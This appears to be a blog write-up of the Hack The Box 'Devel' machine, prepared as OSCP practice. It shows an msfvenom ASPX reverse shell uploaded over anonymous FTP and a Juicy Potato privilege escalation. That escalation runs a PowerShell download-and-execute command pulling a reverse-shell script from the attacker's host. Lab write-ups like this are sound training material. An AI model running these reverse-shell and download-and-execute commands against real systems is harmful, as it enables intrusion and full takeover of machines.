# Devel Overview

This is the ninth box in my OSCP prep series.

**Box Details**

|IP|OS|User-Rated Difficulty|Date Started|Date Completed|
|---|---|---|---|---|
|10.10.10.5|Windows (7)|3.6|2021-06-14|2021-06-14|

This was a great easy box that involved uploading a webshell to a site via an FTP directory that linked to the webroot. Privesc to system involved exploiting `SeImpersonatePrivilege` using Juicy Potato. The box took me just over 90 minutes in total, which is a nice time frame for a low-end OSCP box equivalent.

---

This was my first time successfully running a potato exploit, and it feels good to have another tool under my belt!

I can also feel myself getting better at windows - I'm faster, and more familiar with the tools, tricks, and file upload methods. This is all pretty basic stuff still, but I'm enjoying laying the foundations.

I think although I'm getting faster, I need to be quicker taking notes. This process definitely slows me down, and I'm sure I can cut out a lot of the markdown formatting until the end when the box is finished.

## Ratings

I rated both flags a 3 - foothold was extremely easy, and I would have rated it a 1, but I couldn't read either of the flags until I got SYSTEM on the box. The priv esc was slightly harder - Juicy Potato is very well documented, but getting all the steps together to execute it wasn't straightforward enough to rate it lower.

## nmap

I started with a standard `nmap` scan:

Key findings:

	- Anonymous login is allowed
- Running a webserver on port 80
	- IIS 7.5

### All Ports

I waited a second to make sure the box wasn't blocking ping probes, then set off an all ports scan to run after my main one finished:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ sleep 300; nmap -p- -oA nmap/devel-allports 10.10.10.5
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-14 11:50 BST

PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 131.92 seconds
```

It didn't find any new ports.

# FTP

My first port of call was checking out FTP.

We can do anonymous login:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel/ftp]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:mac): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
```

If we make a file locally, we can put it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ mkdir ftp
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ echo "test" > test
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ mv test ftp/
```

On the FTP client:

```
?Invalid command
ftp> put test
local: test remote: test
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
6 bytes sent in 0.09 secs (0.0625 kB/s)
```

So we have arbitrary upload permissions. Let's check out the site to see if we can exploit this.

*Note*: we don't need to be in the `ftp` directory when we launch the client - we can connect to FTP then use `lcd ftp` also.

# Website

Visiting `http://10.10.10.5`, we just see a welcome page:

![](/assets/images/blogs/Pasted image 20210614115346.png)

Viewing the source, the image is `welcome.png` from same level as the root directory of the site:

![](/assets/images/blogs/Pasted image 20210614115441.png)

Going to `/test`, we can't see the file we put:

![](/assets/images/blogs/Pasted image 20210614115505.png)

What if we put a HTML file? Or an ASP file? Before we try, it's worth seeing what it's running:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ curl -v http://10.10.10.5
*   Trying 10.10.10.5:80...
* Connected to 10.10.10.5 (10.10.10.5) port 80 (#0)

< X-Powered-By: ASP.NET

< Content-Length: 689
< 
```

`curl` reckons it's ASP.NET, as expected from an IIS server. We can try to confirm this - `index.html` doesn't load:

![](/assets/images/blogs/Pasted image 20210614115751.png)

Then again, neither does `index.asp`:

![](/assets/images/blogs/Pasted image 20210614120008.png)

Or `index.aspx`:

![](/assets/images/blogs/Pasted image 20210614120025.png)

Why not just try to upload a shell and see what happens? We can generate an `.asp` reverse shell:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=413 -f asp -o whoops.asp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of asp file: 38610 bytes
Saved as: whoops.asp
```

And try to upload it:

```bash
ftp> put whoops.asp 
local: whoops.asp remote: whoops.asp
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
38680 bytes sent in 0.00 secs (32.9947 MB/s)
```

Great. Now let's start a listener. I'm using port 413 in case Windows Defender blocks higher ports, so I'll need root permissions to listen:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ sudo nc -lnvp 413
[sudo] password for mac: 
listening on [any] 413 ...
```

Now visit the shell:

![](/assets/images/blogs/Pasted image 20210614120438.png)

We get a 500 error, and no shell. But the 500 rather than a 404 indicates we're probably in the right place to trigger it, and the shell is just wrong. How about an `.aspx` payload?

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ msfvenom -p windows/shell_reverse_tcp lhost=tun0 lport=413 -f aspx -o whoopsie.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2728 bytes
Saved as: whoopsie.aspx
```

In FTP:

```bash
ftp> put whoopsie.aspx 
local: whoopsie.aspx remote: whoopsie.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2763 bytes sent in 0.00 secs (16.1657 MB/s)
```

This time the page loaded:

![](/assets/images/blogs/Pasted image 20210614120758.png)

And we got a shell!

![](/assets/images/blogs/Pasted image 20210614120816.png)

Shelling the box took about 20 minutes. We're getting quicker!

We have a few potential exploits here. We can potentially run Rogue/Juicy Potato as we have `SeImpersonatePrivilege` and are a network service, but that depends on our Operating system version. Let's check that:

We're on Windows 7. I [tried Juicy Potato](#trying-juicy-potato)-on-granny,-and-couldn't-get-it-working-due-to-not-being-able-to-extract-a-clsid-on-windows-server-2003.-but-there-are-[plenty](https://ohpe.it/juicy-potato/clsid/windows_7_enterprise/) listed for Windows 7.

Let's try to serve the exploit. As this is an x64 system, the x86 version we tried on Granny won't work - so I'll need to find a binary for x64. Luckily [the releases page](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) has one. I already had this downloaded, and used `locate` to find it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel]
└─$ locate JuicyPotato.exe
/home/mac/Documents/exploits/JuicyPotato.exe
```

I tried a few methods of downloading the file with a HTTP server, before realising I could just use FTP to upload it - however, I wasn't sure where the file would land. I did some digging, and found my shells in `c:\inetpub\wwwroot`:

```cmd
c:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

               3 Dir(s)  22.279.733.248 bytes free
```

This is where IIS files usually are, but I didn't know if it would be different with FTP.

I uploaded the exe:

```bash
┌──(mac㉿kali)-[~/Documents/exploits]
└─$ ftp 10.10.10.5

```

Then tried to execute using the first CLSID on the list:

```cmd
c:\inetpub\wwwroot>JuicyPotato.exe -l 414 -p c:\windows\system32\cmd.exe -t * -c {555F3418-D99E-4E51-800A-6E89CFD8B1D7}

This program cannot be run in DOS mode.
```

I tried a couple more CLSIDs and a different port, but no luck. I looked up the error, and found [this post](https://superuser.com/questions/476808/i-am-getting-this-program-cannot-be-run-in-dos-mode-in-windows-xp):

![](/assets/images/blogs/Pasted image 20210614123703.png)

So I need to turn on binary mode. [This post](https://docs.oracle.com/cd/E19120-01/open.solaris/819-1634/remotehowtoaccess-60496/index.html) shows us how:

```bash

200 PORT command successful.
150 Opening BINARY mode data connection.
226 Transfer complete.
347648 bytes sent in 0.28 secs (1.1910 MB/s)
```

This time it executed! But it wasn't the right architecture, apparently:

This version of c:\inetpub\wwwroot\JuicyPotato.exe is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need a x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.
```

It was then I realised I'd misread the `systeminfo` - the processor type is `x64`, but the system is `x86`.

No bother - we have an `x86` version too. Let's upload it:

```bash
ftp> put Juicy.Potato.x86.exe 
local: Juicy.Potato.x86.exe remote: Juicy.Potato.x86.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
263680 bytes sent in 0.33 secs (789.3519 kB/s)
```

Then execute it:

```cmd
c:\inetpub\wwwroot>Juicy.Potato.x86.exe -l 414 -p c:\windows\system32\cmd.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
Juicy.Potato.x86.exe -l 414 -p c:\windows\system32\cmd.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}

It seemed to work, but didn't pop us out a shell as SYSTEM. I think this may be because it launches the process, but does so in the background - on the [Github](https://github.com/ohpe/juicy-potato) we can see it opening a separate command shell. So maybe we need to send ourselves a shell instead.

I considered using a [powershell reverse shell](#powershell), but didn't know how Juicy Potato would handle the flags and quotation marks - so I just searched "juicy potato reverse shell".

[This hacktricks page](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato) had a few examples - I could use `nc.exe` if I uploaded a shell to the box, but there was an equally nice [powershell example](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato#powershell-rev).

I copied across a `minirev.ps1` script I'd used previously (download [here](https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5)), and edited the connection details:

```powershell
$socket = new-object System.Net.Sockets.TcpClient('10.10.16.211', 414);
```

I served it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/devel/www]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

And used this command:

```bash
c:\inetpub\wwwroot>Juicy.Potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.16.211:8080/minirev.ps1')" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}

After a few seconds, the webserver was hit... and so was my listener!

We can now grab both flags:

And that's the box!

# Key Lessons Learned

- FTP can upload in binary mode (`ftp> binary`) which is useful when pushing `.exe` files
- Use of Juicy Potato to escalate to SYSTEM, using a powershell reverse shell
- Read `systeminfo` carefully - you might see an `x64` processor, but the system may actually be 32-bit
